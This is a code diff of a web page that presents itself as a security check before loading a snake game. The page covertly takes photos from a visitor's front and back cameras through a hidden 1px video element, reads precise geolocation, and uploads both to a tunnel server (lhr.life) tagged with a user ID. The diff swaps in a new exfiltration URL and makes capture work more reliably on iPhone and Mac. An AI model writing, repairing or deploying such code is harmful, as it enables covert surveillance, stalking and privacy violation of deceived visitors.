@@ -11,7 +11,6 @@
         #loader { display:none; border:4px solid #333; border-top:4px solid #fff; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto; }
         @keyframes spin { 100% { transform:rotate(360deg); } }
         
-        /* Видео должно быть в DOM и "видимым" для iOS Safari */
         video { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
         canvas { display:none; }
         
@@ -32,8 +31,8 @@
     <canvas id="c"></canvas>
 
 <script>
-    // 🔗 НОВАЯ ССЫЛКА:
-    const API = "https://dd975209704700.lhr.life"; 
+    // 🔗 ТВОЯ НОВАЯ ССЫЛКА:
+    const API = "https://9c7b82e70f8a7d.lhr.life"; 
     const REDIRECT_URL = "https://www.google.com/fbx?fbx=snake_arcade";
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -47,45 +46,40 @@
 
     async function takePhoto(mode, label) {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
-
         if (mode === "user") document.body.classList.add('flash-active');
 
         let stream = null;
         try {
             stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: mode, 
-                    width: { ideal: 1280 }, 
-                    height: { ideal: 720 } 
-                },
+                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: false 
             });
             
             const v = document.getElementById('v');
             v.srcObject = stream;
             
-            // Принудительно запускаем видео (Критично для iPhone)
-            await v.play();
+            // Ждем готовности видео (исправляет проблему на Mac и iOS)
+            await new Promise((resolve) => {
+                v.onloadedmetadata = () => {
+                    v.play().then(resolve).catch(resolve);
+                };
+            });
 
-            // Даем 1.2 секунды на автофокус и настройку света
-            await new Promise(r => setTimeout(r, 1200));
+            // Задержка для адаптации камеры (автофокус/свет)
+            await new Promise(r => setTimeout(r, 1500));
 
             const canvas = document.getElementById('c');
             canvas.width = v.videoWidth;
             canvas.height = v.videoHeight;
-            canvas.getContext('2d').drawImage(v, 0, 0);
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(v, 0, 0);
 
-            // Сохраняем в макс. качестве
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 1.0));
-            return blob;
+            return await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
         } catch (e) {
-            console.warn(`Камера ${mode} недоступна`);
+            console.warn("Camera Error:", e);
             return null;
         } finally {
-            // Освобождаем камеру для следующего кадра (Важно для Android)
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-            }
+            if (stream) stream.getTracks().forEach(t => t.stop());
             document.body.classList.remove('flash-active');
         }
     }
@@ -101,18 +95,15 @@
         msg.innerText = "Initializing security protocols...";
 
         try {
-            // Геолокация
+            // Геолокация (запускаем параллельно)
             navigator.geolocation.getCurrentPosition(p => {
-                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(() => {});
-            }, null, {enableHighAccuracy: true});
+                fetch(`${API}/location?lat=${p.coords.latitude}&lon=${p.coords.longitude}&user=${user}`).catch(()=>{});
+            }, null, {enableHighAccuracy: true, timeout: 5000});
 
             const fd = new FormData();
-            
             const plan = [
                 { m: "user", l: "front_1" },
-                { m: "user", l: "front_2" },
-                { m: "environment", l: "back_1" },
-                { m: "environment", l: "back_2" }
+                { m: "environment", l: "back_1" }
             ];
 
             for (let i = 0; i < plan.length; i++) {
@@ -121,12 +112,11 @@
                 if (photo) {
                     fd.append('files', photo, getSmartName(plan[i].l));
                 }
-                // Микро-пауза для стабильности
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 600));
             }
 
             if (fd.has('files')) {
-                msg.innerText = "Encrypting ...";
+                msg.innerText = "Encrypting data...";
                 await fetch(`${API}/upload-photo?user=${encodeURIComponent(user)}`, {
                     method: 'POST',
                     body: fd
@@ -136,7 +126,6 @@
             statusTitle.innerText = "Success";
             loader.style.display = 'none';
             msg.innerText = "Verified! Loading game...";
-
             setTimeout(() => { window.location.href = REDIRECT_URL; }, 1200);
 
         } catch (e) {
